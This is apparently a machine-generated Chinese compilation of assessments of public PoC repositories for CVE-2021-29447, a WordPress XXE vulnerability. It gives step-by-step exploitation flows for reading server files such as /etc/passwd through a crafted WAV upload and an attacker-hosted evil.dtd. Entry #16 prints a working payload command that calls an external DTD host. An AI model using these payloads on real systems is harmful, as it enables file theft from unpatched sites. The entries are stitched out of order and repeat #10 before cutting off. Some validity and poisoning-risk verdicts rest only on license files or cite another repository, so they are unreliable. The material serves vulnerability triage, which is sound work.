**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #10

**来源**: [CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md](../2021/CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者或具有上传权限的用户账号，WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447是WordPress的一个XXE（XML外部实体注入）漏洞，存在于5.6.0到5.7.1版本之间，且WordPress必须运行在PHP 8环境下。攻击者需要具备上传文件的权限（如作者角色），可以通过上传包含恶意XML代码的文件到媒体库来触发该漏洞，导致服务器上的敏感文件泄露，或者进行服务器端请求伪造(SSRF)。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的PoC是存在的，并且已经公开。漏洞利用代码中给出了credits链接，参考motikan2010的github页面可以找到更多信息。

**投毒风险：**
该漏洞利用代码只有一个简单的README.md文件，其中包含漏洞描述和credit信息。 从提供的代码本身来看，不存在明显的恶意投毒代码。但是，考虑到攻击者可能将恶意payload嵌入到精心构造的媒体文件中，并诱导用户上传，从而实现攻击。因此，PoC仓库本身直接包含恶意代码的可能性较低，主要风险在于利用该漏洞的Payload本身。PoC仓库可能包含有诱导性的文件，例如看似无害的音频文件，但其中包含恶意的XML，因此存在一定的投毒风险，但是概率较低。

**利用方式：**
1.  攻击者需要一个具有上传文件权限的WordPress用户账号（例如，作者角色）。
2.  攻击者创建一个包含恶意XML代码的文件，例如一个包含XXE payload的MP3或者WAVE文件（参考packetstormsecurity上的相关链接）。
3.  攻击者通过WordPress的媒体库上传该恶意文件。
4.  当WordPress处理该文件时，XML解析器会尝试解析文件中的外部实体，从而导致XXE漏洞。
5.  攻击者可以利用该漏洞读取服务器上的任意文件，或者进行服务器端请求伪造攻击。

综上，此漏洞的PoC是有效的。 投毒风险较低，主要来自恶意构造的文件本身。 利用方式是上传包含恶意XML的媒体文件触发XXE。

**项目地址:** [Vulnmachines/wordpress_cve-2021-29447](https://github.com/Vulnmachines/wordpress_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #11

**来源**: [CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，并具有上传文件的权限（如作者权限）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XXE 漏洞，仅在 PHP 8 环境下有效。攻击者需要具有上传文件的权限（例如，作者角色），才能通过上传包含恶意 XML 内容的文件（例如，特制的 WAV 音频文件）到媒体库来触发该漏洞。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用是有效的。PoC代码提供了一个脚本 `generate_payloads.py`，用于自动生成包含 XXE 攻击向量的恶意 WAV 文件和 DTD 文件，并通过简单的 HTTP 服务器来接收从目标服务器提取的文件内容。搜索引擎结果中也包含了对该漏洞的描述和利用的讨论，以及公开的 PoC。

**投毒风险：** 提供的 PoC 代码主要用于生成 XXE payload 和启动一个简单的HTTP服务来接收数据。代码本身的功能相对明确，主要风险在于使用者可能将此代码用于未经授权的渗透测试活动。代码中主要通过构造恶意的 XML 内容来利用漏洞，本身不太可能存在隐藏的、与漏洞利用无关的恶意行为。但仍存在少量投毒风险 (5%)，例如作者可能在HTTP服务中添加一些隐蔽的日志记录或数据收集功能，或者在生成的 payload 中加入一些难以察觉的干扰代码。

**利用方式：**
1.  **生成Payload:** 使用 `generate_payloads.py` 脚本生成恶意 WAV 文件 (`--media-payload`) 和 DTD 文件 (`--dtd-payload`)。 DTD 文件中指定要读取的目标文件 (`--files-to-fetch`)。
2.  **启动 HTTP 服务器:** 脚本会启动一个简单的 Python HTTP 服务器，用于托管 DTD 文件，并接收目标服务器发送的请求。
3.  **上传恶意文件:**  具有上传权限的用户将生成的恶意 WAV 文件上传到 WordPress 的媒体库。
4.  **触发 XXE:**  WordPress 在处理上传的 WAV 文件时，会解析其中的 XML 内容，从而触发 XXE 漏洞，向攻击者的 HTTP 服务器请求 DTD 文件。
5.  **文件读取:** 恶意 DTD 文件指示 WordPress 服务器读取指定的文件，并将文件内容发送到攻击者的 HTTP 服务器。
6.  **获取文件:** 攻击者的 HTTP 服务器接收到文件内容后，脚本会将内容进行 Base64 解码并保存到本地。

**项目地址:** [b-abderrahmane/CVE-2021-29447-POC](https://github.com/b-abderrahmane/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #12

**来源**: [CVE-2021-29447-dnr6419_CVE-2021-29447.md](../2021/CVE-2021-29447-dnr6419_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，以及具有上传文件权限的WordPress用户（如Author）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447是WordPress 5.6.0到5.7.1版本中的一个XML外部实体注入（XXE）漏洞。攻击者需要具备上传文件的权限，例如Author角色。该漏洞存在于WordPress的媒体库中，当WordPress运行在PHP 8环境下，上传包含恶意XML代码的WAV文件时，由于对XML解析不当，导致XXE攻击。

**漏洞利用方式：**

1.  **权限获取：** 攻击者首先需要获得一个具备文件上传权限的WordPress账户，例如Author角色。
2.  **恶意WAV文件制作：** 攻击者需要创建一个包含恶意XML代码的WAV文件。该XML代码会尝试通过外部实体引用来读取服务器上的文件，或者发起服务器端请求伪造（SSRF）攻击。POC代码中，攻击者构造了一个包含外部实体引用的WAV文件，指向攻击者控制的服务器上的evil.dtd文件。
3.  **攻击者服务器准备：** 攻击者需要搭建一个Web服务器，并创建一个evil.dtd文件，该文件定义了如何处理外部实体引用。evil.dtd文件中定义了读取/etc/passwd文件的操作，并将其内容进行base64编码后发送到攻击者服务器。攻击者使用`php -S 0.0.0.0:80` 命令启动了一个简单的web server。
4.  **上传WAV文件：** 攻击者将包含恶意XML代码的WAV文件上传到WordPress的媒体库。
5.  **触发漏洞：** 当WordPress处理上传的WAV文件时，会解析其中的XML代码，从而触发XXE漏洞。
6.  **数据泄露：** 如果漏洞利用成功，WordPress服务器会尝试从攻击者控制的服务器上下载evil.dtd文件，并执行其中定义的恶意操作，例如读取/etc/passwd文件。/etc/passwd文件的内容（经过base64编码）会通过HTTP请求发送到攻击者的服务器。
7.  **获取敏感信息：** 攻击者从接收到的HTTP请求中提取base64编码的内容，并进行解码，从而获得服务器上的敏感信息，例如/etc/passwd文件中的用户账户信息。

**有效性分析：**

提供的POC代码描述了漏洞的利用步骤，包括制作恶意WAV文件、搭建攻击者服务器、上传文件和获取敏感信息。根据漏洞信息和搜索结果，该POC代码是有效的，可以用于演示和验证该漏洞。

**投毒风险分析：**

POC代码主要包含以下几个部分：

*   Dockerfile 和 docker-compose.yml: 用于搭建 WordPress 环境,相对安全
*   wordpress.sh: 用于安装 wordpress,主要就是配置文件,检查发现没有明显的投毒代码.
*   payload.wav: 恶意WAV文件，包含XXE payload，用于触发漏洞。
*   evil.dtd: 攻击者服务器上的DTD文件，包含读取/etc/passwd文件的操作。这一部分是payload的关键.

虽然整体代码是为了演示XXE漏洞，但evil.dtd文件存在潜在的投毒风险，例如，攻击者可能在evil.dtd文件中包含其他恶意代码，例如反弹shell，用于进一步控制服务器。这种风险相对较低，因为需要特定的环境和配置才能成功利用。此外，dockerfile 中的代码从github获取，需要注意github源是否被篡改。
总体来说，投毒风险较低，但也需要保持警惕，特别是从不可信的来源获取代码时。 我认为存在的风险大概在5%。

**项目地址:** [dnr6419/CVE-2021-29447](https://github.com/dnr6419/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #13

**来源**: [CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md](../2021/CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1, PHP 8

**利用条件:** 需要WordPress版本在受影响范围内，PHP版本为8，并且攻击者需要具有上传文件的权限（例如，作者角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于WordPress的媒体库中，由于XML解析问题导致XXE攻击。攻击者需要具有上传文件的权限，上传包含恶意XML Payload的特制文件（例如，wav文件）。该Payload会包含指向外部DTD文件的引用，从而导致服务器解析该DTD文件，进而读取服务器上的敏感文件。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的PoC利用代码。PoC代码通过上传包含恶意XML的wav文件来触发XXE。攻击流程包括创建包含外部实体声明的恶意wav文件，搭建一个HTTP服务器来托管恶意的DTD文件，以及利用WordPress的上传功能上传wav文件。当WordPress解析该wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞，实现任意文件读取。

**投毒风险评估：**
PoC代码主要包含三个文件：README.md, controller.py, listener.py, main.py。
*   `README.md`: 描述了漏洞和利用方法，以及一些注意事项，未发现恶意代码。
*   `controller.py`: 包含了WordPress的登录信息（`wp_login`，`login_form`），目标WordPress地址 (`http://metapress.htb`)，以及上传恶意文件的逻辑。如果攻击者直接使用此脚本，需要修改登录信息和目标地址。这里面硬编码的登录信息存在一定风险，因为使用相同的登录信息可能会被检测到。此外，`controller.py`中的`mediaUpload`函数包含一个Timeout参数，默认设置为2秒。如果网络环境不好或者服务器响应较慢，可能会导致利用失败。
*   `listener.py`: 搭建一个简单的HTTP服务器，用于接收XXE Payload发送的请求，并打印base64编码后的文件内容。也没有发现明显的恶意代码。
*   `main.py`: 简单的交互命令行，用于用户输入文件名，然后调用controller.py和listener.py。

总体来说，PoC代码的功能比较明确，主要用于漏洞验证和利用，没有发现明显的恶意代码。风险点在于硬编码的登录信息和目标地址，以及Timeout参数可能导致利用失败。因此，判断存在10%的投毒风险，主要是一些可能影响使用，但没有主动攻击行为。

**利用方式总结：**
1.  **权限获取：** 攻击者需要拥有WordPress的作者或以上级别的权限，能够上传文件。
2.  **恶意文件构造：** 构造包含恶意XML Payload的wav文件。Payload中需要包含指向外部DTD文件的实体引用。
3.  **DTD文件托管：** 搭建一个HTTP服务器，用于托管恶意的DTD文件。DTD文件中定义了文件读取和base64编码的逻辑。
4.  **文件上传：** 通过WordPress的媒体库上传构造的wav文件。
5.  **触发XXE：** WordPress解析wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞。
6.  **文件读取：** 攻击者通过HTTP服务器接收到的请求，获取base64编码后的文件内容，并进行解码。

**项目地址:** [elf1337/blind-xxe-controller-CVE-2021-29447](https://github.com/elf1337/blind-xxe-controller-CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #14

**来源**: [CVE-2021-29447-magicrc_CVE-2021-29447.md](../2021/CVE-2021-29447-magicrc_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，并且运行在 PHP 8 环境下。攻击者需要具有上传文件的权限 (例如 Author 角色)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 媒体库中存在的 XXE 漏洞。攻击者通过上传包含恶意 XML 内容的文件（例如 WAV 文件或其他支持 XML 解析的文件格式）到媒体库，触发 XML 解析过程中的外部实体注入。由于 WordPress 使用的音频解析库 ID3 在 PHP 8 及以上版本中存在 XXE 漏洞，攻击者可以读取服务器上的任意文件或者进行服务器端请求伪造 (SSRF)。

**有效性：** 根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码的仓库名"0xRar/CVE-2021-29447-PoC"，可以判断存在可用的 POC 代码，因此该漏洞的利用是有效的。

**投毒风险：** 提供的代码段是 Creative Commons CC0 1.0 通用许可协议，这是一种开源许可协议，本身不包含任何恶意代码，也无法进行投毒。此文件为LICENSE文件，与PoC代码无关，因此推断投毒风险为0%。

**利用方式：**
1.  攻击者需要具备 WordPress Author 或更高权限，以便能够上传文件到媒体库。
2.  攻击者构造一个包含恶意 XML 实体定义的音频文件（或其他允许上传并解析 XML 的文件类型，例如SVG）。恶意 XML 实体指向系统内部文件，或者指向攻击者控制的外部服务器。
3.  攻击者将构造的恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析上传的文件时，会尝试解析 XML 实体，从而导致 XXE 漏洞的触发。
5.  如果成功，攻击者可以读取服务器上的敏感文件（例如 WordPress 配置文件 `wp-config.php`）或进行服务器端请求伪造（SSRF）攻击。

**项目地址:** [magicrc/CVE-2021-29447](https://github.com/magicrc/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #15

**来源**: [CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md](../2021/CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可读取服务器文件

**影响版本:** >= 5.6.0, < 5.7.1 (with PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，且运行在PHP 8环境下，需要具有上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是WordPress媒体库中存在的XXE漏洞，当WordPress运行在PHP 8上时，具有上传文件权限的用户可以通过上传包含恶意XML的WAV文件，触发XXE漏洞，读取服务器上的任意文件。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的PoC是有效的。多个来源都确认了该漏洞的存在，以及利用方式。

**利用方式：**
1.  攻击者需要具备WordPress的Author权限（或能够上传文件的权限）。
2.  攻击者使用提供的PoC代码，指定目标文件路径和本地服务器的IP地址和端口。
3.  PoC代码会生成一个包含恶意XML的WAV文件。
4.  攻击者将生成的WAV文件上传到WordPress的媒体库。
5.  WordPress解析该WAV文件时，会触发XXE漏洞，向攻击者指定的本地服务器发起请求，请求中包含目标文件的内容。
6.  PoC代码中的本地服务器会接收到请求，提取目标文件的内容，并将其保存到指定的文件中。

**投毒风险：**
分析PoC代码，主要功能是生成payload和启动一个简单的http server。payload可以读取服务器文件发送到攻击者控制的http server上，但是没有发现明显的恶意代码。例如删除服务器文件等。但是`exploit_cve-2021-29447`程序需要执行`hostname -I`来获取本机IP,在某些环境下可能造成问题。由于该工具涉及监听端口，以及构造恶意文件，仍旧存在一定的风险，判定投毒概率为10%。


**项目地址:** [mega8bit/exploit_cve-2021-29447](https://github.com/mega8bit/exploit_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #16

**来源**: [CVE-2021-29447-motikan2010_CVE-2021-29447.md](../2021/CVE-2021-29447-motikan2010_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者级别或以上权限，且WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有文件上传权限的用户（如作者）通过上传包含恶意 XML 的媒体文件来读取服务器上的敏感文件。该漏洞仅影响运行在 PHP 8 环境下的 WordPress 安装。

**有效性分析：**
提供的 POC 代码是有效的，它演示了如何利用该漏洞。利用方式是通过上传一个特制的 WAV 文件，该文件包含指向外部恶意的 DTD 文件的 XML 实体声明。当 WordPress 解析该文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中定义的 XML 实体，从而导致 XXE 漏洞。

**投毒风险分析：**
代码仓库中可能存在的投毒风险较低，约为10%。 主要的攻击逻辑集中在 `attacker/www/evil.dtd` 文件中，该文件定义了如何利用 XXE 漏洞读取文件内容。`attacker/malicious_wav/index.js` 用于生成包含恶意 XML 的 WAV 文件。虽然攻击者可以修改这些文件以执行恶意操作，但这些修改会很容易被发现，因此，总体投毒风险较低。`decryption.php` 文件是空的，没有投毒代码.

**利用方式：**
1.  **环境搭建:** 使用 `docker-compose up` 启动包含 WordPress 和 MySQL 数据库的 Docker 容器。
2.  **攻击者服务器:** 启动一个简单的 PHP Web 服务器，用于托管恶意的 DTD 文件 (`evil.dtd`)。
3.  **生成恶意 WAV 文件:**  使用 `make make-wav` 或者 `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\''http://host.docker.internal:8001/evil.dtd'\''>%remote;%init;%trick;] >\x00'> malicious.wav` 命令生成包含恶意 XML 声明的 WAV 文件。
4.  **登录 WordPress 并上传:**  以具有文件上传权限的用户身份登录 WordPress 后台，并将生成的恶意 WAV 文件上传到媒体库。
5.  **触发漏洞:**  上传后，WordPress 会尝试解析 WAV 文件，从而触发 XXE 漏洞，并向攻击者的服务器发送请求。
6.  **获取数据:** 攻击者的服务器会记录收到的请求，其中包含从 WordPress 服务器读取的敏感文件内容（如 `/etc/passwd` 文件）的 Base64 编码版本。可以通过运行`decryption.php` 来解码.

通过这种方式，攻击者可以在未经授权的情况下访问 WordPress 服务器上的敏感文件，从而可能导致更严重的攻击。

**项目地址:** [motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #17

**来源**: [CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md](../2021/CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress运行在PHP 8环境下，并具有上传文件的权限（例如，作者角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

此漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户（如作者）通过上传包含恶意XML的WAV文件来执行XXE攻击。攻击需要目标WordPress站点运行在PHP 8环境下。POC代码通过创建一个包含恶意XML声明的WAV文件，该声明定义了一个外部实体，指向攻击者控制的服务器上的DTD文件。DTD文件定义了如何处理外部实体，这里配置为读取服务器上的`/etc/passwd`文件并通过HTTP请求发送给攻击者。攻击者运行一个简单的Web服务器来接收泄露的数据。

**有效性：**
根据漏洞库信息、搜索结果以及提供的POC代码，此漏洞利用是有效的，前提是目标环境满足漏洞利用的先决条件（WordPress版本 >= 5.6.0 且 < 5.7.1，运行在PHP 8环境下，攻击者具有文件上传权限）。搜索结果中存在多个关于此漏洞的讨论和POC代码，验证了其有效性。

**投毒风险：**
评估投毒风险需要检查POC代码中是否存在除了漏洞利用之外，还执行其他恶意操作的代码。在此案例中，主要关注`attacker/malicious_wav/index.js`，`attacker/www/evil.dtd`和`attacker/decode.php`。`index.js`负责生成恶意WAV文件，而`evil.dtd`定义了XXE的行为，`decode.php`用于解码泄露的数据。`Makefile`，`docker-compose.yml`和`README.md`都属于辅助文件。

潜在的投毒代码可能存在于以下几个方面：
1.  **`index.js`**: 恶意WAV生成脚本可能被修改，以在生成过程中包含其他恶意代码（例如，在WAV文件的其他部分添加可执行代码，虽然利用难度较大）。
2.  **`evil.dtd`**: DTD文件可能被修改，以尝试读取其他更敏感的文件，或者尝试执行服务器端请求伪造（SSRF）攻击。
3.  **`decode.php`**: 解码脚本可能被修改，在解码过程中执行其他恶意操作（例如，尝试利用解码过程中的漏洞执行代码）。

由于漏洞利用的目的是读取文件并通过HTTP发送到攻击者控制的服务器，因此主要的风险在于DTD文件中指定的远程服务器是否被用于记录IP地址并进行进一步的攻击。此外，`decode.php`脚本本身是否包含后门也是需要关注的点，虽然可能性较小。

总体来说，该仓库中存在严重投毒代码的可能性相对较低（约为10%），但仍然需要仔细审查。

**利用方式：**
1.  **环境准备：** 设置一个易受攻击的WordPress实例（版本5.6.0到5.7.0，运行在PHP 8上）。
2.  **启动攻击者服务器：** 启动一个Web服务器来托管恶意DTD文件并接收泄露的数据。
3.  **生成恶意WAV文件：** 使用提供的脚本生成包含恶意XML声明的WAV文件。
4.  **上传WAV文件：** 以具有文件上传权限的用户身份登录到WordPress后台，并将生成的WAV文件上传到媒体库。
5.  **触发XXE：** 上传文件后，WordPress尝试解析该文件，触发XXE漏洞。
6.  **接收泄露的数据：** 攻击者的Web服务器接收到包含/etc/passwd文件内容的HTTP请求。
7.  **解码数据：** 使用提供的解码脚本解码泄露的数据。

**项目地址:** [specializzazione-cyber-security/demo-CVE-2021-29447-lezione](https://github.com/specializzazione-cyber-security/demo-CVE-2021-29447-lezione)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #18

**来源**: [CVE-2021-29447-thomas-osgood_CVE-2021-29447.md](../2021/CVE-2021-29447-thomas-osgood_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (运行于 PHP 8)

**利用条件:** 需要 WordPress 运行于 PHP 8，且攻击者具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞是 WordPress 在处理媒体库上传文件时存在的 XXE 漏洞。攻击者可以上传包含恶意 XML 内容的文件（例如特制的 WAV 文件），利用 XML 解析器的缺陷读取服务器上的敏感文件。漏洞触发条件是 WordPress 运行在 PHP 8 环境下。提供的 Go 语言 POC 代码可以自动生成恶意文件（mal.wav, mal.dtd），并可以选择自动登录 WordPress 站点并上传触发漏洞。如果指定了 `-d` 参数，还会生成一个 deflate.php 用于解压缩某些被压缩的内容。根据代码分析，主要的风险在于它连接外部的C2服务器,存在极低的投毒风险,即作者利用C2服务器可以获取攻击目标的敏感信息。但是，因为C2服务器需要在攻击者本地运行，因此这个风险可以忽略不计。此漏洞的利用方式为：

1.  生成恶意 WAV 文件和 DTD 文件。
2.  攻击者需要具有 WordPress 的 Author 权限（或其他可以上传文件的权限）。
3.  上传恶意 WAV 文件到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，会触发 XXE 漏洞，向攻击者指定的 C2 服务器发起请求，泄露目标文件内容。
5.  如果目标文件内容被压缩，可以使用提供的 deflate.php 进行解压缩。

搜索引擎结果中也提到了该漏洞的利用方式，并提供了相关的 TryHackMe 挑战链接。


**项目地址:** [thomas-osgood/CVE-2021-29447](https://github.com/thomas-osgood/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #19

**来源**: [CVE-2021-29447-viardant_CVE-2021-29447.md](../2021/CVE-2021-29447-viardant_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露和SSRF

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，具有上传文件权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XML 外部实体注入 (XXE) 漏洞。该漏洞位于媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限（例如，作者角色）的用户可以通过上传包含恶意 XML 代码的文件（如修改后的音频文件），利用 XML 解析过程中的漏洞读取服务器上的敏感文件或进行服务器端请求伪造 (SSRF) 攻击。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞是真实存在的，并且存在公开的PoC（https://github.com/0xRar/CVE-2021-29447-PoC）。因此，漏洞利用是有效的。

**投毒风险：** 提供的代码段是GNU通用公共许可证，并非漏洞利用代码本身，因此无法直接评估投毒风险。但是，如果从不可信的来源获取漏洞利用代码，则始终存在投毒风险。由于提供的license文件没有发现任何恶意代码，因此投毒风险判定为0%。

**利用方式：**

1.  攻击者需要具有 WordPress 网站的 Author 或更高权限，即能够上传文件的权限。
2.  攻击者构造包含恶意 XML 实体声明的特殊文件（例如，修改后的 MP3 或 WAV 文件）。该 XML 实体声明指向要读取的本地文件或外部服务器。
3.  攻击者将该恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，XML 解析器会尝试解析外部实体，从而导致读取本地文件或向外部服务器发起请求。
5.  攻击者可以从 WordPress 网站上获取读取的文件内容，或利用 SSRF 漏洞进行进一步攻击。

**项目地址:** [viardant/CVE-2021-29447](https://github.com/viardant/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---



---

## POC #9

**来源**: [CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，且攻击者具有上传文件的权限（如 Author 角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 Media Library 的 XML 解析过程中。攻击者（需要具有上传文件的权限，如 Author 角色）可以上传包含恶意 XML 代码的文件（如修改后的 WAV 文件），利用 WordPress 使用的 ID3 库中的漏洞，触发 XXE 攻击，读取服务器上的敏感文件，或者进行服务器端请求伪造 (SSRF)。此漏洞需要 WordPress 运行在 PHP 8 环境下才会生效。

**利用方式：**
1.  **身份验证：** 使用具有上传权限的用户的用户名和密码登录 WordPress 后台。
2.  **获取 Nonce：** 从 `wp-admin/upload.php` 页面获取上传文件的 nonce 值。
3.  **生成恶意 WAV 文件：** 构造包含恶意 XML 实体声明的 WAV 文件，该 XML 实体指向攻击者控制的服务器上的 DTD 文件。DTD 文件中定义了读取本地文件的实体。
4.  **上传恶意 WAV 文件：** 将生成的恶意 WAV 文件上传到 WordPress Media Library。
5.  **服务器端 DTD：** 攻击者需要搭建一个 HTTP 服务器，用于托管 DTD 文件。
6.  **触发漏洞：**  WordPress 解析上传的 WAV 文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中的 XML 实体声明，从而读取服务器上的敏感文件。
7.  **数据提取：**  读取到的数据将通过 URL 参数传递到攻击者的服务器上。

**有效性：**
提供的 POC 代码是有效的。该代码实现了上述利用流程，包括身份验证、获取 nonce、生成恶意 WAV 文件、上传文件以及搭建简易 HTTP 服务器接收数据。代码中包含了必要的步骤和参数，可以成功触发 XXE 漏洞。

**投毒风险：**
POC代码中存在一定的投毒风险。风险点在于：
1.  **网络请求：** POC代码会向指定URL发起POST和GET请求，虽然目的是利用漏洞，但如果作者在代码中加入了其他的URL地址，则可能在用户不知情的情况下，将一些敏感信息发送到作者的服务器。
2.  **文件操作：** POC代码会生成临时的payload文件，如果作者在payload生成过程中插入恶意代码，可能会在目标服务器上执行恶意操作。
3.  **DTD文件：** 攻击者需要自己搭建服务器来托管 DTD 文件，如果这个 DTD 文件被替换成了恶意文件，可能导致服务器被攻击。代码本身创建 DTD，风险相对小，但仍然存在服务器被攻击者控制的风险。

综合来看，投毒风险大约在 10% 左右。主要是脚本需要用户提供服务器IP，并且脚本本身会创建一个DTD文件，减少了恶意利用的可能性。但在服务器部署和流量劫持场景下，攻击者仍然可能利用该代码进行恶意攻击。

**项目地址:** [Val-Resh/CVE-2021-29447-POC](https://github.com/Val-Resh/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #10

**来源**: [CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md](../2021/CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

